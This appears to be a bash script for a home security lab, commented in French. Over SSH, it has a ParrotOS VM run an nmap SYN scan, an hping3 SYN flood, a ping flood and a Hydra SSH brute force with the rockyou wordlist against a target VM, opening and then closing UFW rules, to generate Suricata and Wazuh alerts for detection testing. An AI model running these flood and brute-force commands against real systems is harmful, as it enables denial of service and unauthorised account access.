#!/bin/bash
# attack-from-parrot.sh — Lance des attaques depuis ParrotOS vers la Target
# Usage : ./attack-from-parrot.sh <duree_secondes>
# ============================================================
# Execute SUR LE MANAGER.
# ParrotOS (192.168.30.9) envoie du trafic vers la Target (192.168.30.10)
# -> Suricata voit les paquets via af-packet (meme avec UFW)
# -> Wazuh genere des alertes authentiques

DURATION=${1:-300}
PARROT_IP="192.168.30.9"
TARGET_IP="192.168.30.10"
PARROT_USER="live"
SSH_KEY="$HOME/.ssh/id_ed25519_parrot"

echo "========================================="
echo "  ATTAQUE DEPUIS PARROTOS (${DURATION}s)"
echo "  Cible : $TARGET_IP"
echo "========================================="
echo ""

# --- Phase 1 : Verifier l'acces SSH a ParrotOS ---
echo "[1/5] Verification de l'acces a ParrotOS..."
ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new -o BatchMode=yes -i "$SSH_KEY" "$PARROT_USER"@"$PARROT_IP" "hostname" > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "[ECHEC] ParrotOS injoignable ($PARROT_IP)"
  echo "  Verifie que la VM est allumee et que la cle SSH est deployee."
  echo "  Cle publique : cat $SSH_KEY.pub"
  exit 1
fi
echo "[OK] ParrotOS joignable ($PARROT_IP)"
PARROT_SSH=true

# --- Phase 2 : Regle UFW temporaire sur la Target ---
echo "[2/5] Ajout regle UFW temporaire pour ParrotOS..."
ssh target "sudo ufw allow from $PARROT_IP to any port 22 proto tcp comment 'TEMP: ParrotOS SSH' 2>/dev/null"
ssh target "sudo ufw allow from $PARROT_IP to any port 80 proto tcp comment 'TEMP: ParrotOS HTTP' 2>/dev/null"
ssh target "sudo ufw allow from $PARROT_IP proto icmp comment 'TEMP: ParrotOS ICMP' 2>/dev/null"
echo "[OK] Regles temporaires ajoutees"

# --- Phase 3 : Lancer les attaques ---
echo "[3/5] Lancement des attaques..."
echo "  -> Nmap scan rapide (10 ports)"
ssh -i "$SSH_KEY" "$PARROT_USER"@"$PARROT_IP" "sudo nmap -sS -p 22,80,443,8080,3306,5432,6379,27017,8443,9090 -T4 $TARGET_IP" &
NMAP_PID=$!
sleep 10

echo "  -> Hping3 flood (SYN flood, 10s)"
ssh -i "$SSH_KEY" "$PARROT_USER"@"$PARROT_IP" "sudo hping3 -S --flood -p 80 $TARGET_IP -c 500" &
HPING_PID=$!
sleep 5

echo "  -> Ping flood (ICMP)"
ssh -i "$SSH_KEY" "$PARROT_USER"@"$PARROT_IP" "ping -f -c 100 $TARGET_IP" &
PING_PID=$!
sleep 5

echo "  -> Hydra bruteforce SSH (30 tentatives)"
ssh -i "$SSH_KEY" "$PARROT_USER"@"$PARROT_IP" "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 $TARGET_IP ssh -o /tmp/hydra_result.txt 2>/dev/null" &
HYDRA_PID=$!

echo "[OK] Attaques lancees en parallele"

# Attendre la duree demandee
echo "[4/5] Attente de ${DURATION}s pour les attaques..."
sleep "$DURATION"

# Nettoyer les processus
kill $NMAP_PID $HPING_PID $PING_PID $HYDRA_PID 2>/dev/null
echo "[OK] Attaques terminees"

# --- Phase 4 : Nettoyage UFW ---
echo "[5/5] Nettoyage des regles UFW temporaires..."
ssh target "sudo ufw delete allow from $PARROT_IP to any port 22 proto tcp 2>/dev/null"
ssh target "sudo ufw delete allow from $PARROT_IP to any port 80 proto tcp 2>/dev/null"
ssh target "sudo ufw delete allow from $PARROT_IP proto icmp 2>/dev/null"
echo "[OK] Regles temporaires supprimees. ParrotOS de nouveau bloque."

# --- Bilan ---
echo ""
echo "========================================="
echo "  CAMPAGNE TERMINEE"
echo "  Attaques depuis : ParrotOS ($PARROT_IP)"
echo "  Duree : ${DURATION}s"
echo "  Cible : $TARGET_IP"
echo "========================================="
echo ""
echo "Pour verifier les alertes :"
echo "  - Alertes Suricata : ssh target 'sudo tail -20 /var/log/suricata/fast.log'"
echo "  - Alertes Wazuh : wc -l /var/ossec/logs/alerts/alerts.json"
echo "  - Predictions ML : curl http://127.0.0.1:9090/predictions/recent?limit=10"
